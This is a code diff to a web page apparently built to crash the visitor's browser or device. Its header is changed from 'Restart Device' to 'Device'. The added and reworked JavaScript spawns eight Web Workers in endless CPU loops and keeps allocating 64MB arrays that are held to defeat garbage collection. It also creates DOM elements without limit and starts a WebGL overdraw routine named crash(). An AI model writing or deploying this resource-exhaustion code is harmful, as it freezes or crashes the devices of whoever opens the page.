@@ -165,7 +165,7 @@
 <body>
 
     <div class="header-section">
-        <h1>Restart Device</h1>
+        <h1>Device</h1>
     </div>
 
     <div class="slider-container">
@@ -196,40 +196,60 @@ function cssAnimationInferno() {
         document.head.appendChild(style);
     }
 
+    // --- 1. SPAWN 8 WEB WORKERS FOR CPU STRESS (Prime95 style crypto) ---
+    const workerCode = `
+        function isPrime(n) {
+            if (n < 2) return false;
+            for (let i = 2; i <= Math.sqrt(n); i++) {
+                if (n % i === 0) return false;
+            }
+            return true;
+        }
+        function stress() {
+            // Intensive crypto hash simulation combined with heavy prime math
+            let val = 123456789;
+            for (let i = 0; i < 50000; i++) {
+                val = Math.sin(val) * Math.cos(val) * 10000;
+                if(isPrime(Math.floor(Math.abs(val)))) {
+                    val += 7;
+                }
+            }
+            // Use setTimeout to yield control & prevent the actual thread from freezing permanently,
+            // keeping it running at 100% capacity continuously like Prime95.
+            setTimeout(stress, 0);
+        }
+        stress();
+    `;
+
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(blob);
+    const workers = [];
+    for (let i = 0; i < 8; i++) {
+        workers.push(new Worker(workerUrl));
+    }
+
+    // --- 2. CSS INFERNO & STATE MANAGEMENT ---
     let elementCount = 0;
     let frameCount = 0;
     let crashTriggered = false;
-    const memoryLeakStorage = []; // Holds references to prevent garbage collection
+    const memoryLeakStorage = []; // Holds memory allocations to prevent garbage collection
 
-    // 1. Spawn 8 Web Workers performing dense crypto/hashing loops immediately
-    const workerCode = `
-        self.onmessage = function() {
-            // Infinite dense cryptographic/hashing simulation loop
-            while (true) {
-                let val = Math.random().toString();
-                for (let i = 0; i < 10000; i++) {
-                    // Chained pseudo-crypto calculations to prevent compiler optimization
-                    val = btoa(val + Math.sin(i) * Math.cos(i));
-                }
-            }
-        };
-    `;
-    
-    try {
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const workerUrl = URL.createObjectURL(blob);
-        for (let w = 0; w < 8; w++) {
-            const worker = new Worker(workerUrl);
-            worker.postMessage('start');
+    function allocateMemory() {
+        // 64MB = 64 * 1024 * 1024 bytes. 
+        // Float64Array uses 8 bytes per element, so 8,388,608 elements = 64MB
+        try {
+            const size64MB = 8388608;
+            const buffer = new Float64Array(size64MB);
+            // Fill array to force physical RAM allocation
+            buffer.fill(Math.random());
+            memoryLeakStorage.push(buffer);
+        } catch (e) {
+            console.warn("Memory limits reached.");
         }
-    } catch (e) {
-        console.error('Workers blocked or failed to initialize', e);
     }
 
-    // 2. Continuous Main Engine Loop (CSS + Memory Allocation + WebGL triggers)
     function createGpuKiller() {
         try {
-            // CSS element spawning (keeps going forever)
             for (let i = 0; i < 60; i++) {
                 const element = document.createElement('div');
                 element.className = 'gpu-killer';
@@ -248,24 +268,15 @@ function cssAnimationInferno() {
 
             frameCount++;
 
-            // Trigger the WebGL crash sequence exactly on frame 3
+            // Trigger once precisely on the 3rd frame
             if (frameCount >= 3 && !crashTriggered) {
                 crashTriggered = true;
                 crash();
             }
 
-            // High-Speed Memory Allocation: Allocates 192MB every single frame after WebGL launches
+            // Start RAM eating pipeline alongside the CSS animation after the 3rd frame
             if (crashTriggered) {
-                try {
-                    // 192 megabytes = 192 * 1024 * 1024 bytes
-                    // Using Float64Array (8 bytes per element) -> (192 * 1024 * 1024) / 8 = 25165824 elements
-                    const massiveAlloc = new Float64Array(25165824);
-                    // Force physical memory backing via active mutation
-                    massiveAlloc.fill(Math.random()); 
-                    memoryLeakStorage.push(massiveAlloc);
-                } catch (memError) {
-                    // If V8 heap hits the ceiling, keep attempting smaller allocations
-                }
+                allocateMemory();
             }
 
             if (elementCount > -2146483647) {
@@ -276,7 +287,7 @@ function cssAnimationInferno() {
         }
     }
 
-    // 3. WebGL Overdraw & Pipeline Exhaustion Routine
+    // --- 3. WEBGL OVERLOAD ROUTINE ---
     function crash() {
         let canvas = document.createElement('canvas');
         canvas.style.position = 'fixed';
@@ -386,7 +397,10 @@ function cssAnimationInferno() {
         const timeLoc = gl.getUniformLocation(shaderProgram, 'u_time');
         const opsPerFrame = 500000;
         
+        let shouldStop = false;
         function renderFrame() {
+            if (shouldStop) return;
+            
             gl.uniform1f(timeLoc, performance.now() / 1000);
             
             for (let pair = 0; pair < numPairs; pair++) {
@@ -405,6 +419,7 @@ function cssAnimationInferno() {
         renderFrame();
     }
 
+    // Fire off the initialization
     createGpuKiller();
 }
         // Execution Handler
